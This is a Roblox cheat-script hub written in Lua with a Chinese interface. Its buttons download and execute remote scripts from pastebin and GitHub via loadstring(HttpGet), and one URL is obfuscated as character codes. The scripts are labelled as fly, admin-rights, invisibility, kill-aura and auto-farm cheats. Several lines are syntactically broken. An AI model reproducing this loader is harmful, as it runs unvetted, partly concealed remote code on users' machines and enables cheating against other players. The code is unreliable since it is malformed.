local CoreGui = game:GetService("StarterGui")

CoreGui:SetCore("SendNotification", {
    Title = "小空脚本",
    Text = "正在加载（反挂机已开启）",
    Duration = 5, 
})
print("反挂机开启")
        local vu = game:GetService("VirtualUser")
        game:GetService("Players").LocalPlayer.Idled:connect(function()
           vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
           wait(1)
           vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
        end)
local OrionLib =loadstring(game:HttpGet("https://pastebin.com/raw/FUEx0f3G"))()
local Window = OrionLib:MakeWindow({Name = "小空脚本", HidePremium = false, SaveConfig = true,IntroText = "欢迎使用小空脚本", ConfigFolder = "欢迎使用小空脚本"})
local about = Window:MakeTab({
    Name = "小空脚本",
    Icon = "rbxassetid://93566402708060",
    PremiumOnly = false
})

about:AddParagraph("您的用户名:"," "..game.Players.LocalPlayer.Name.."")
about:AddParagraph("您的注入器:"," "..identifyexecutor().."")
about:AddParagraph("您当前服务器的ID"," "..game.GameId.."")


local Tab = Window:MakeTab({
    Name = "作者",
    Icon = "rbxassetid://93566402708060",
    PremiumOnly = false
})

Tab:AddButton({
    Name = "晓空",
    Callback = function()
       end
})

local Tab = Window:MakeTab({
    Name = "复制",
    Icon = "rbxassetid://93566402708060",
    PremiumOnly = false
})

Tab:AddButton({
   Name = "点击复制群号",
   Callback = function()
    setclipboard("934692663")
   end
})

Tab:AddButton({
   Name = "点击复制作者QQ号",
   Callback = function()
    setclipboard("2032685964")
   end
})
local Tab = Window:MakeTab({
    Name = "脚本",
    Icon = "rbxassetid://93566402708060",
    PremiumOnly = false
})

local Section = Tab:AddSection({
    Name = "功能"
})

Tab:AddButton({
    Name = "鸭",
    Callback = function()
loadstring(game:HttpGet(utf8.char((function() return table.unpack({104,116,116,112,115,58,47,47,112,97,115,116,101,98,105,110,46,99,111,109,47,114,97,119,47,81,89,49,113,112,99,115,106})end)())))()
   end
})

Tab:AddButton({
    Name = "皮",
    Callback = function()
loadstring(game:HttpGet(('https://raw.githubusercontent.com/xiaopi77/xiaopi77/main/QQ1002100032-Roblox-Pi-script.lua')))()
    end
})

Tab:AddButton({
    Name = "X",
    Callback = function()
loadstring(game:HttpGet(('https://raw.githubusercontent.com/maowang1/X/refs/heads/main/Protected_7336712241286912.txt')))()
    end
})

Tab:AddButton({
    Name = "冷",
    Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/LENG8123/UI/refs/heads/main/ohio%20library.txt"))()        
    end
})
local Tab = Window:MakeTab({
    Name = "通用",
    Icon = "rbxassetid://93566402708060",
    PremiumOnly = false
})

Tab:AddButton({
    Name = "飞行",
    Callback = function()   loadstring(game:HttpGet("https://github.com/user-attachments/files/20122339/xiaoFly.txt"))()
      end    
})

Tab:AddButton({
    Name = "玩家加入游戏提示",
    Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/boyscp/scriscriptsc/main/bbn.lua"))()
     end 
})

Tab:AddButton({
    Name = "获得管理员权限",
    Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/sZpgTVas"))()
     end 
})

Tab:AddButton({
    Name = "iw指令",
    Callback = function()
local Tab = Window:MakeTab({
loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))()
     end 
})

Tab:AddButton({
    Name = "旋转",
    Callback = function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/dingding123hhh/tt/main/%E6%97%8B%E8%BD%AC.lua')))()
      end 
})

Tab:AddButton({
    Name = "飞车",
    Callback = function()
loadstring(game:HttpGet('https://pastebin.com/raw/G3GnBCyC'), true))()
      end 
})

Tab:AddButton({
    Name = "隐身",
    Callback = function()
loadstring(game:HttpGet('https://pastebin.com/raw/nwGEvkez')))()
     end 
})
local Tab = Window:MakeTab({
    Name = "俄亥俄州",
    Icon = "rbxassetid://93566402708060",
    PremiumOnly = false
})

Tab:AddButton({
    Name = "刷印钞机",
    Callback = function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/XTScripthub/Ohio/main/MoneyPrinterFinder')))()
    end 
})

Tab:AddButton({
    Name = "传送加自动工作",
    Callback = function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/LOLking123456/ohio/main/Roblox232')))()
    end 
})

Tab:AddButton({
    Name = "杀戮光环",
    Callback = function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/Xingtaiduan/Script/main/Games/Ohio')))()
    end 
})

Tab:AddButton({
    Name = "外国1",
    Callback = function()
loadstring(game:HttpGet('https://pastebin.com/raw/0MqfXpvY'), true))()
    end 
})

Tab:AddButton({
    Name = "国内1",
    Callback = function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua')))()
    end 
})